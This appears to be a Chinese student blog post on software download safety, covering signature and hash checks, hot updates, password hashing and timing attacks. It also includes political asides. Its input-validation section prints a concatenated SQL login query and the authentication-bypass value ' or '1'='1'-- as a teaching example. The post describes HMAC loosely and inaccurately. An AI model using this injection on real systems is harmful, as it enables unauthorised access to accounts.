+<p>大家想知道<a target="_blank" rel="noopener" href="https://notepad-plus-plus.org/news/notepad-7.3.3-fix-cia-hacking-issue.html">Notepad++官网是怎么说</a>的吗？感觉他们要被气炸了，官方能说出来f-word，真的是很气。</p>
+<blockquote>
+<p>Just like knowing the lock is useless for people who are willing to go into my house, I still shut the door and lock it every morning when I leave home. We are in a f**king corrupted world, unfortunately. 对在那些想进我房子的人来说，我家的锁显得毫无作用。虽然如此，但我每天早上离开家时，还是会锁上门。然不幸的是，我们生活在一个操蛋的堕落世界！</p>
+</blockquote>
+<h3 id="原因之三：你咋就那么相信你下载到的签名是正确的呢？"><a href="#原因之三：你咋就那么相信你下载到的签名是正确的呢？" class="headerlink" title="原因之三：你咋就那么相信你下载到的签名是正确的呢？"></a>原因之三：你咋就那么相信你下载到的签名是正确的呢？</h3><p>唉，其实还是第一个问题啊，假如你是从http网站上下载到的签名文件，那毫无疑问这个签名未必是原汁原味的……</p>
+<h3 id="Android的apk签名"><a href="#Android的apk签名" class="headerlink" title="Android的apk签名"></a>Android的apk签名</h3><p>Android的apk也是带有签名的，签名的目的就是保证每个应用程序开发商合法ID，防止部分开放商可能通过使用相同的包名来混淆替换已经安装的程序。简单的说，就是你把某个APP改了改，自己签名，再安装，你若不卸载原来的APP，你是安装不上你自己的版本的（用幸运破解器等破解了签名保护机制的不算）</p>
+<h3 id="Linux下校验签名"><a href="#Linux下校验签名" class="headerlink" title="Linux下校验签名"></a>Linux下校验签名</h3><p>Linux下也是可以校验签名的，比如我们经常会在某些软件下载链接旁边看到一个sig按钮，下载之后是一个asc文件，这个asc文件就是用来校验签名的。nautilus直接双击，当同名文件（不包括扩展名）存在时，就会自动校验，否则会弹窗让你选择目标文件进行校验，或者选择用<code>gpg2 –verify test.asc test.zip</code>也可以校验。</p>
+<p>使用nautilus与gpg2校验数字签名成功与失败的截图（失败是我给压缩包中的一个readme略作修改啦）</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_5.png"><img src="/images/061017_0014_5.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_4.png"><img src="/images/061017_0014_4.png"></a></p>
+<p>注意：咱可能得先用命令从<code>keyserver</code>导入公钥才可以，命令大致如下：</p>
+<p>gpg2 –keyserver pool.sks-keyservers.net –search-keys AA65421D</p>
+<p>其中 <code>pool.sks-keyservers.net</code>可替换成<code>pgp.mit.edu</code>等，<code>AA65421D</code>是ID</p>
+<h2 id="校验散列值"><a href="#校验散列值" class="headerlink" title="校验散列值"></a>校验散列值</h2><p>在某些网站上 ，我们可能还会看到下载地址旁边给了个md5、sha1的散列值，这是方便我们校验的。假如我们的散列值和网站上给出的一样，那么这里的散列值就应该是完全一致的；如果不同，那么就意味着出问题啦。</p>
+<p>那么这个过程中存在哪些漏洞呢？</p>
+<h3 id="单项散列函数可被碰撞"><a href="#单项散列函数可被碰撞" class="headerlink" title="单项散列函数可被碰撞"></a>单项散列函数可被碰撞</h3><p>咱有人可能知道，几个月前的大新闻，<a target="_blank" rel="noopener" href="http://www.infoq.com/cn/news/2017/02/google-first-sha1-collision">Google成功碰撞SHA1</a>，再就之前md5的碰撞。呐，我猜你懂了吧。</p>
+<h3 id="不安全呈现散列值的方法"><a href="#不安全呈现散列值的方法" class="headerlink" title="不安全呈现散列值的方法"></a>不安全呈现散列值的方法</h3><p>某些网站呐，它在下载页面显示的散列值（尽管它的下载链接可能是https的或者是其他的能够保证文件完整性的下载方式），但是它的那个页面是http的，那就是说这个页面可能被篡改，那这散列值还有啥用嘛……</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_6.png"><img src="/images/061017_0014_6.png"></a></p>
+<p>（<a target="_blank" rel="noopener" href="http://msdn.itellyou.cn/">msdn我告诉你</a>中枪了。不过，咱可以去微软官网比对散列值，https的页面噢！）</p>
+<p>上面说了这么多本来我们可能觉得天衣无缝的校验方式，其实都是存在<strong>一定程度</strong>的缺陷的。那可能有人想问了，这么罕见的、高级的攻击方式，可能不是经常存在的吧。没错，这种方式咱称之为<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E9%95%BF%E6%9C%9F%E5%A8%81%E8%83%81">APT</a>（不是三磷酸腺苷，也不是Debian系的apt），遇到政府级别的攻击（由政府支持的攻击者，比如说NSA啦，嘿嘿嘿啦），那这是可能的。</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_7.png"><img src="/images/061017_0014_7.png"></a></p>
+<p>（图片来自<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2017/05/my-blog-under-government-backed-attack.html">编程随想</a>）</p>
+<h2 id="那么说了这么多，咱究竟该如何安全的下载软件啊？"><a href="#那么说了这么多，咱究竟该如何安全的下载软件啊？" class="headerlink" title="那么说了这么多，咱究竟该如何安全的下载软件啊？"></a>那么说了这么多，咱究竟该如何安全的下载软件啊？</h2><p>好吧，咱们都是一般人，那么<strong>时刻记得去官网下载、记得检查下载链接是否正常，尽可能的校验散列值、数字签名</strong>。尤其是对于（中国大陆）开发者来说，IDE什么的不去官网下载，不校验散列值和签名，那不就是在拿用户的隐私与安全开玩笑吗？<strong>不会翻墙，好意思说自己是程序员？</strong></p>
+<p>啥？你想去某某管家什么的下载软件？求别逗啊，看我<a target="_blank" rel="noopener" href="http://www.huorong.cn/info/148826116759.html">藏恶意代码</a>，看我捆绑</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_8.png"><img src="/images/061017_0014_8.png"></a></p>
+<p>（百度：我们已经收购腾讯 叫你不取消勾选，<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/24472672">图片来源知乎</a>）</p>
+<h2 id="除了下载，更新也是个问题……"><a href="#除了下载，更新也是个问题……" class="headerlink" title="除了下载，更新也是个问题……"></a>除了下载，更新也是个问题……</h2><p>有很多软件啊，它更新的时候是通过http的，然后还不校验，那么就很容易被篡改。别说，真有个木马就是干这事了，比如说大名鼎鼎的<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2016/08/Trojan-Horse-DCM.html">黑暗幽灵木马</a>（据推测，这家伙也应该是政府背景）。什么你还不信？这几天大火的NotPetya不就是利用了M.E Doc 更新不带数字签名么！</p>
+<h2 id="热更新"><a href="#热更新" class="headerlink" title="热更新"></a>热更新</h2><p>提到更新，我突然想起近期Apple全面封杀热更新，真的是可喜可贺的大好事啊！</p>
+<h3 id="热更新是个啥"><a href="#热更新是个啥" class="headerlink" title="热更新是个啥"></a>热更新是个啥</h3><p>App由两种更新方式，一种是在App Store内进行更新，更新时重新下载全部安装包；另一种就是热更新，用户只有在打开App时才会发现热更新包，更新时只需下载安装更新部分的代码，再次打开时即可，这样可以直接绕过苹果App Store的审核。简单的讲就是绕过App store的审核，打开App才会进行”应用内更新”。</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/2017061000590178.jpg"><img src="/images/2017061000590178-1024x576.jpg"></a></p>
+<p>（阴阳师的热更新）</p>
+<h3 id="这样有啥不好呢"><a href="#这样有啥不好呢" class="headerlink" title="这样有啥不好呢"></a>这样有啥不好呢</h3><p>咱举个例子，好好的一个应用，可以瞬间变成看小黄图的应用；好好的一个应用，可以瞬间加上后门监控用户隐私；更可怕的是，万一有黑客作祟呢？咱知道，写代码未必都有很强的安全意识啊。</p>
+<p>现在，<strong>手机中包含的隐私已经超越了人们的想象</strong>，只要给我一个人的手机，那么我就可以了解他的一切。</p>
+<p>从库克叫板FBI、要求App内必须使用https、再到封杀热更新，<strong>肆意扩张的权力，是对自由最大的威胁</strong>。</p>
+<p>其实Google的Play Store<strong>也是禁止热更新</strong>的，没看支付宝啥的没少被下架嘛。（你敢相信，你平时用的好多应用根本没在Play Store上架？）可是大陆这种地方，三不管，毕竟Android和安卓是不一样的……（是，就连推送系统都要自己搞了？你这轮子是方的五边形的啊，反正不会是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8B%92%E6%B4%9B%E4%B8%89%E8%A7%92%E5%BD%A2">莱洛三角形</a>就对了）Google啊……Google啊，你咋就这么不管不顾我们这群处在<strong>水深火热</strong>的人呢啊，开始讨厌你了哦。</p>
+<p><strong>对，我必须要黑阿里，支付宝隐私事件、抢月饼、截图中加数字盲水印还有一大堆放屁的话，阿里的节操在银河系外，我一天不黑阿里我就不舒服。</strong></p>
+<p>说到这，似乎文章标题里的事情就说完了，似乎本文可以画上句号，但是……</p>
+<h2 id="程序员们的安全素质"><a href="#程序员们的安全素质" class="headerlink" title="程序员们的安全素质"></a>程序员们的安全素质</h2><p>其实我不是一名合格的程序员，我写这一段只是为了装逼的，逃</p>
+<h3 id="开发工具的获取"><a href="#开发工具的获取" class="headerlink" title="开发工具的获取"></a>开发工具的获取</h3><p>假如你是一名活在天朝的程序员，那么一定要记得<strong>去官网下载开发工具，然后校验证书或散列值</strong>。那个golang的开发者们……<strong>不会翻墙、不热爱翻墙、不想推墙，好意思说自己是搞IT的</strong>？反正我是不好意思。</p>
+<h2 id="如何存储用户的密码"><a href="#如何存储用户的密码" class="headerlink" title="如何存储用户的密码"></a>如何存储用户的密码</h2><h3 id="明文存密码"><a href="#明文存密码" class="headerlink" title="明文存密码"></a>明文存密码</h3><p>在几年前，我做某个课程设计的时候，无数的人在实现登录的时候都将用户名和密码<strong>明文存入数据库中</strong>（包括我，我当时的安全意识很差）；咱学生，可能没太大安全意识，这一点可以理解，但是对于一个商业产品来说， 明文存密码？啥，不信，这就在我身边，看图。<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/2011%E5%B9%B4%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%AB%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%BA%8B%E4%BB%B6">还有CSDN呢</a></p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_9.png"><img src="/images/061017_0014_9.png"></a></p>
+<p>（遇到一个明文存密码的家伙，你还想怎么办？）</p>
+<p>假如你是一名学生，需要做个狗屎一样的课设，还恰巧需要有类似登录的功能，请一定要注意，<strong>千万不可以明文存密码</strong>。我猜可能有人会反驳，这就是个课设，为啥要这么注意？嗯，那是因为啊，咱程序员就是要从细节做起，千里之堤毁于蚁穴啊。</p>
+<h3 id="自己实现加密（散列）算法"><a href="#自己实现加密（散列）算法" class="headerlink" title="自己实现加密（散列）算法"></a>自己实现加密（散列）算法</h3><p>哎唷我说，你真是把自己当成天才能干翻全世界的密码学家吗？你就是密码学博博博博博博士也不行啊。无论何时请一定要记得，<strong>别想着自己造加密算法，别想着算法保密就能够保证机密性，隐蔽式安全是不可取的</strong>。想想DVD的加密算法是怎么被破解的就知道了。</p>
+<h3 id="hash一下存进去？"><a href="#hash一下存进去？" class="headerlink" title="hash一下存进去？"></a>hash一下存进去？</h3><p>稍微有点安全意识的程序员可能会将用户的密码hash一次，或者n次，或者自作聪明的<code>md5(sha1(&#39;test&#39;))</code>，然后放入数据库中，<strong>这都没啥太大的区别</strong>。很明显，散列一下要比明文存密码好一些，但是却依旧存在<strong>非常严重的安全隐患</strong>。为啥？哎呀，大部分散列函数算的都很快的，用户都是喜欢123456的，用户都是喜欢一个密码走天下的，彩虹表很方便的，撞库很容易的。</p>
+<p>注意，之所以不推荐hash很多次以及混合hash，是因为密码学中有一个理论叫做”<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9F%AF%E5%85%8B%E9%9C%8D%E5%A4%AB%E5%8E%9F%E5%89%87">柯克霍夫原则</a>“，拿到了你数据库，也基本上意味着会拿到源代码。</p>
+<h3 id="试试HMAC？"><a href="#试试HMAC？" class="headerlink" title="试试HMAC？"></a>试试HMAC？</h3><p>HMAC是个啥？其实挺复杂的，一句话可能说不完，但是简单说就是把AES和Hash结合起来，就是比如说用某个AES密钥加密了用户的密码，然后再hash一次再存入数据库中（当然这个说法太不准确了，实际上要比这复杂得多）。这样想要暴力破解是不太容易了，但是还是有问题呢，问题就是，假如某两个用户密码恰巧都是123456，那他们<strong>存的内容不就一样了吗</strong>？咱知道，用户都是喜欢123456的，黑客可以通过批量注册或者是根据算法批量生成大量弱口令的值，这样密码还是被破解出来啦。</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_10.png"><img src="/images/061017_0014_10.png"></a></p>
+<p>（HMAC在某个商业产品中的实现，从class文件反编译出来的。我受到了程序员的嘲讽）</p>
+<p>我就知道你们还不信，那么请看图，此HMAC的散列值<code>37e0c8f50a64a454</code>对应的密码是<code>000000</code>，来看看多少用户的密码都是<code>000000</code>——2817人，此系统的总用户数接近3万。  <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/201706100135267.png"><img src="/images/201706100135267.png"></a></p>
+<h3 id="加个随机盐？"><a href="#加个随机盐？" class="headerlink" title="加个随机盐？"></a>加个随机盐？</h3><p>加盐是个啥？咱知道，用户都是喜欢12345的，但是假如我们在密码中加入一段随机的盐值，比如说<code>ZVhWbENnPT0K</code>然后再hash一下存入数据库中，那么这密码强度不就显著提高了嘛~对噢，<strong>盐别短，别重复</strong>。</p>
+<p>请注意，<code>test1</code>和<code>test2</code>的密码都是弱口令<code>123456</code>，但是咱可以看到这存的东西完全不同嘛。  <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_12.png"><img src="/images/061017_0014_12.png"></a></p>
+<h3 id="随机盐就够了吗……？不够"><a href="#随机盐就够了吗……？不够" class="headerlink" title="随机盐就够了吗……？不够"></a>随机盐就够了吗……？不够</h3><p>实现随机盐就够了吗？当然那不够了。我们考虑下如下的用来判断密码的伪代码(这里的这俩字符串，是散列值哦，不应该是明文密码哦～)</p>
+<p>if(‘123456’&#x3D;&#x3D;’111111’)<br>    do something;<br>else<br>    warning;</p>
+<p>我们重点看那两个字符串（把&#x3D;&#x3D;写成&#x3D;的就不要说啦嘻嘻）。大部分语言是怎么比较这字符串的呢？它们会从第一位开始比较，发现都是1，那么好，继续比，第二位一个是2一个是1，那就是不等了，那就是false吧。这其中有啥问题呢？</p>
+<p>咱说，这其中，”第一位就不同”与”第二位才不同”是<strong>存在运算的时间差</strong>的。假如平均比较一位需要10ns，那么要进行攻击，我们先猜测第一位是1，如果返回false时间基本上小于10ns，那么意味着我们<strong>第一位猜测是错误的</strong>；如果返回false时间明显长于10ns，那么意味着<strong>至少我们第一位的猜测是正确的</strong>；以此类推，我们可以通过这个微妙的时间差来一位一位的猜解密码。听着很不可思议、觉得很变态是不？这可是大名鼎鼎的”<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/%E6%97%81%E8%B7%AF%E6%94%BB%E5%87%BB">边信道攻击（旁路攻击）</a>“，更准确的说是时序攻击，<a target="_blank" rel="noopener" href="https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf">已经有人实现了</a></p>
+<p>那这可咋办啊！麻蛋啊，变态啊，简直了啊。好办，管他啥样的，应用慢比较算法都给固定时间返回就可以了。</p>
+<h3 id="再进一步……"><a href="#再进一步……" class="headerlink" title="再进一步……"></a>再进一步……</h3><p>咱知道大部分散列函数都很快，但是假如咱使用比较慢的散列函数呢？哎嘿嘿这是个好主意，比如说Dropbox用的bcrypt，嗯很好很棒。</p>
+<h3 id="哎呀，你快说这些技术都咋实现吧，我不会写啊！"><a href="#哎呀，你快说这些技术都咋实现吧，我不会写啊！" class="headerlink" title="哎呀，你快说这些技术都咋实现吧，我不会写啊！"></a>哎呀，你快说这些技术都咋实现吧，我不会写啊！</h3><p><a target="_blank" rel="noopener" href="https://crackstation.net/hashing-security.htm">你戳我，这里有完整的介绍</a>……</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/defuse/password-hashing">你戳我，这里有源代码</a>……</p>
+<p>PS，PHP7自带个<code>password_hash</code>，也很不错。但是好像很多人用Python啊，那咋办呢，没事，有一个很成熟的库叫做<a target="_blank" rel="noopener" href="https://passlib.readthedocs.io/en/stable/index.html">passlib</a>，很完美。其他语言欢迎补充。</p>
+<p>噢对，对于web应用来说，要记得在服务端hash，要记得HTTPS，要记得防范XSS和注入，要记得有一个清晰的逻辑思维别注册的时候就告诉用户你这个密码和某某某用户重复了……</p>
+<h2 id="如何验证输入：永远把你的用户当成坏人"><a href="#如何验证输入：永远把你的用户当成坏人" class="headerlink" title="如何验证输入：永远把你的用户当成坏人"></a>如何验证输入：永远把你的用户当成坏人</h2><p>也许产品经理会打死我？</p>
+<p>好吧，假如我们设计一个登录界面，这样就需要构造一个SQL语句了，那么可能有些人是这样写的：</p>
+<p>str&#x3D;”select * from admin where aUser&#x3D;’”+username+”‘“ and aPassword&#x3D;’”+password+”‘“;</p>
+<p>其中<code>username</code>和<code>passowrd</code>的用户需要输入的内容（变量），假如我们在<code>username</code>中填入<code>&#39; or &#39;1&#39;=&#39;1&#39;--</code>，SQL查询语句会变成下面这个样子</p>
+<p>select * from admin where aUser&#x3D;’’ or ‘1’&#x3D;’1’– and aPassword&#x3D;’’</p>
+<p>实际上是这段（后面是注释）</p>
+<p>select * from admin where aUser&#x3D;’’ or ‘1’&#x3D;’1’</p>
+<p>这是一条<strong>恒等式</strong>，一定会查询出结果（结果集返回为真）并<strong>绕过验证</strong>。麻蛋，被注入了吧，还好是被注入了，不是被<code>drop table</code>了。要是jdbc这还好，毕竟分号没用……</p>
+<p>那咋办呢？笨办法，把用户输入的<code>or, –,&#39;;</code>等关键字和特殊字符都过滤了，大不了抛出异常而已呗……或者用语言内建的安全机制（比如说JDBC的<code>PreparedStatement</code>就可以很大程度的防止SQL注入）</p>
+<p>PS，在Web开发中，对于用户提交的表单也要过滤啊，要不被XSS的就不好玩了啊哈哈！（微信又中枪了）</p>
+<h2 id="客户端哈希还是服务端哈希"><a href="#客户端哈希还是服务端哈希" class="headerlink" title="客户端哈希还是服务端哈希"></a>客户端哈希还是服务端哈希</h2><p>今晚（8月12日）看到一篇很搞笑的文章，就是说一个明文登录被ISP搞了。部分摘录如下：<a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/201708121348194.jpg"><img src="/images/201708121348194-300x178.jpg"></a></p>
+<p>这个程序员可以炒了，链接<a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/896355175472013313">戳我</a></p>
+<p>无论何时，一定要记得<strong>凡是涉及到登录的界面就要使用HTTPS</strong>，甚至毫不过分的说应该全站HTTPS。因为如果不是全站HTTPS，有些情况下登录那个按钮的A标签就是可以被篡改进而钓鱼或者降级的。</p>
+<p>除了登录，也应该<strong>至少</strong>使用服务器哈希。也就是说服务端哈希、服务端+客户端哈希都是可以的，但是<strong>只有客户端哈希是不可以的</strong>，因为这样就会造成重放攻击。更详细的说，就是这样的：</p>
+<h3 id="只使用客户端哈希，非SSL"><a href="#只使用客户端哈希，非SSL" class="headerlink" title="只使用客户端哈希，非SSL"></a>只使用客户端哈希，非SSL</h3><p>那么骇客就可以直接截获到这个哈希，那么他只要把这个哈希值发送给服务器，他就能够被授权登录，可实际上他并不知道用户的密码，这就是所谓的重放攻击；</p>
+<h3 id="只使用客户端哈希，SSL"><a href="#只使用客户端哈希，SSL" class="headerlink" title="只使用客户端哈希，SSL"></a>只使用客户端哈希，SSL</h3><p>很显然骇客拿到哈希的机率就很低了；但是假如服务器的数据库被脱下来了，那么还是一样的道理，只要发送哈希给服务器，就能够被授权登录，照样被重放攻击。</p>
+<p>想要加个序号、时间戳、随机数什么的防止重放攻击？只要明文就是扯淡……被脱库照样完蛋。</p>
+<p>在这种情况下被重放攻击的根本原因是，<strong>服务器太过于相信客户端</strong>，服务器认为客户端发出的请求都是经过正常的应用逻辑的，服务器把客户端发过来的哈希值直接存入数据库。</p>
+<h3 id="至少使用服务端哈希、非SSL"><a href="#至少使用服务端哈希、非SSL" class="headerlink" title="至少使用服务端哈希、非SSL"></a>至少使用服务端哈希、非SSL</h3><p>不说啥了，MITM即可。</p>
+<h3 id="至少使用服务端哈希，SSL"><a href="#至少使用服务端哈希，SSL" class="headerlink" title="至少使用服务端哈希，SSL"></a>至少使用服务端哈希，SSL</h3><p>这种情况下，哪怕黑客拿到数据库，也只能玩彩虹表了；如果程序员安全意识比较强，用了随机盐，那就更不好破解了。</p>
+<p>总结一句话就是，<strong>不带SSL就是耍流氓，至少要使用服务端哈希</strong>。（客户端用JS搞个RSA，大哥，你是来搞笑的吗？这和客户端哈希没有任何本质上的区别，照样重放）</p>
+<p>好吧，关于程序员的安全素质，我目前就能想到这几点。</p>
+<h2 id="1984与双重思想"><a href="#1984与双重思想" class="headerlink" title="1984与双重思想"></a>1984与双重思想</h2><p>请先看一遍下面这个图（凤凰网在911十周年的街头采访视频），图片偷自<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2014/01/doublethink.html">编程随想</a></p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/06/061017_0014_13.png"><img src="/images/061017_0014_13-214x1024.png"></a></p>
+<p>如果你不觉得这个人脑袋有问题、不觉得有矛盾，那么恭喜，你多半已经被朝廷改造成双重思想了。</p>
+<p><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9B%99%E6%83%B3">双重思想</a>（doublethink）来自于乔治·奥威尔的1984，简单说就是<strong>同时接受两种互相矛盾的、抵触的思想信念却不觉得矛盾</strong>。</p>
+<p>对真理部记录司的雇员们来说，双想意味着可以歪曲史实，然后对他们刚写下的新历史坚信不移。双重思想不仅仅可以用来洗脑民众，还可以用来洗脑体制的维护者，而且效果贼好！</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>好吧，历时九个月，我终于把<a target="_blank" rel="noopener" href="https://dmesg.app/school-0.html">这一系列</a>的坑填完了，感谢当时鼓励我开这一系列的某同学，感谢鼓励我的某学长，当然更要感谢给了我无数灵感的某童鞋！我们下个系列再见???</p>
+<p>最后，请允许我用著名文学家小罗伯特·土而奇·豆斯基的一句话来结束本文吧：</p>
+<p>黄色的道路上分出了两条路，我选择了绕远的那条路，是因为我知道哪怕有万分之一遇见你的机会也是值得的。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/06/10/school-6/index/" data-id="clhp6he1y007rezqrhynk5saw" data-title="[学校上网系列]6.从下载软件中想到的：哎妈呀防不胜防啊" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/11/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/13/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/china/">china</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/china/justsay/">justsay</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/cloudflare/">cloudflare</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/">it</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/it/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/">justsay</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/justsay/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/website/">website</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/program/">program</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/program/share/">share</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/">security</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/security/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/security/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/share/">share</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/website/">website</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/website/program/">program</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/what/">what</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/what/gfw/">gfw</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/ubuntu/" style="font-size: 10px;">ubuntu</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a 